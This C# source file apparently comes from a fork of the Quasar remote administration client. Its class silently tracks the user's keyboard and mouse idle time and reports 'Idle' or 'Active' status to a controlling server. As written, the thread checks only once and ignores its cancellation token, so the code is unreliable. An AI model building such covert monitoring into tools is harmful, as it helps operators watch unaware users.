

using InvokedClient.Helper;
using InvokedClient.Networking;
using InvokedCommon.Enums;
using InvokedCommon.Messages;
using InvokedCommon.Networking;
using System;
using System.Threading;


namespace InvokedClient.User
{
	public class ActivityDetection : IDisposable
	{
		private UserStatus _lastUserStatus;
		private readonly QuasarClient _client;
		private readonly CancellationTokenSource _tokenSource;
		private readonly CancellationToken _token;

		public ActivityDetection(QuasarClient client)
		{
			this._client = client;
			this._tokenSource = new CancellationTokenSource();
			this._token = this._tokenSource.Token;
			client.ClientState += new Client.ClientStateEventHandler(this.OnClientStateChange);
		}

		private void OnClientStateChange(Client s, bool connected)
		{
			if (!connected)
				return;
			this._lastUserStatus = UserStatus.Active;
		}

		public void Start() => new Thread(new ThreadStart(this.UserActivityThread)).Start();

		private void UserActivityThread()
		{
			try
			{
				if (this.IsUserIdle())
				{
					if (this._lastUserStatus == UserStatus.Idle)
						return;
					this._lastUserStatus = UserStatus.Idle;
					this._client.Send<SetUserStatus>(new SetUserStatus()
					{
						Message = this._lastUserStatus
					});
				}
				else
				{
					if (this._lastUserStatus == UserStatus.Active)
						return;
					this._lastUserStatus = UserStatus.Active;
					this._client.Send<SetUserStatus>(new SetUserStatus()
					{
						Message = this._lastUserStatus
					});
				}
			}
			catch (Exception ex) when (ex is NullReferenceException || ex is ObjectDisposedException)
			{
			}
		}

		private bool IsUserIdle()
		{
			long num = (long)Environment.TickCount - (long)NativeMethodsHelper.GetLastInputInfoTickCount();
			return (num > 0L ? num / 1000L : 0L) > 600L;
		}

		public void Dispose()
		{
			this.Dispose(true);
			GC.SuppressFinalize((object)this);
		}

		protected virtual void Dispose(bool disposing)
		{
			if (!disposing)
				return;
			this._client.ClientState -= new Client.ClientStateEventHandler(this.OnClientStateChange);
			this._tokenSource.Cancel();
			this._tokenSource.Dispose();
		}
	}
}